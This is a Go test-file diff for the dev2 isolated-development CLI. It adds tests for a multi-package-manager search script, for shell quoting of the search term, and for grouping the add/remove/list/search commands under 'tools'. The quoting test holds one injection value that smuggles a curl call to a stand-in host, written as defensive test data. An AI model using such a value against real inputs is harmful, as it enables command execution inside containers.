@@ -7,6 +7,8 @@ import (
 	"strings"
 	"testing"
 
+	"github.com/spf13/cobra"
+
 	"github.com/mwing/isolated-dev/go/internal/config"
 	"github.com/mwing/isolated-dev/go/internal/runner"
 )
@@ -292,5 +294,61 @@ func TestRunIsBlockedUntilSettingsAreAccepted(t *testing.T) {
 	}
 	if !strings.Contains(h.stderr.String(), "dev2 accept") {
 		t.Errorf("error should name the remedy:\n%s", h.stderr.String())
+	}
+}
+
+func TestSearchScriptHandlesEachPackageManager(t *testing.T) {
+	// The image family is not known in advance: it comes from the project,
+	// or from whatever base a language template chose.
+	script := searchScript("ripgrep", 25)
+	for _, mgr := range []string{"apt-get", "apk", "dnf"} {
+		if !strings.Contains(script, mgr) {
+			t.Errorf("no %s branch:\n%s", mgr, script)
+		}
+	}
+	if !strings.Contains(script, "head -n 25") {
+		t.Errorf("limit not applied:\n%s", script)
+	}
+}
+
+func TestSearchTermIsQuoted(t *testing.T) {
+	// The term goes into a shell script. A term carrying a quote or a
+	// semicolon would otherwise run as a command inside the container.
+	script := searchScript("rip'; curl evil.example.com; #", 10)
+	if strings.Contains(script, "curl evil.example.com;\n") {
+		t.Fatalf("term escaped its quoting:\n%s", script)
+	}
+	if !strings.Contains(script, `'\''`) {
+		t.Errorf("quote not escaped:\n%s", script)
+	}
+}
+
+func TestToolsCommandsAreGroupedUnderTools(t *testing.T) {
+	// The prefix says what you are doing; `dev2 add` alone did not.
+	h := newHarness(t)
+	root := NewRootCmd(h.env)
+
+	var tools *cobra.Command
+	for _, c := range root.Commands() {
+		if c.Name() == "tools" {
+			tools = c
+		}
+		if c.Name() == "add" || c.Name() == "remove" {
+			t.Errorf("%q is still a top-level command", c.Name())
+		}
+	}
+	if tools == nil {
+		t.Fatal("no tools command")
+	}
+	want := map[string]bool{"add": false, "remove": false, "list": false, "search": false}
+	for _, c := range tools.Commands() {
+		if _, ok := want[c.Name()]; ok {
+			want[c.Name()] = true
+		}
+	}
+	for name, found := range want {
+		if !found {
+			t.Errorf("dev2 tools %s missing", name)
+		}
 	}
 }
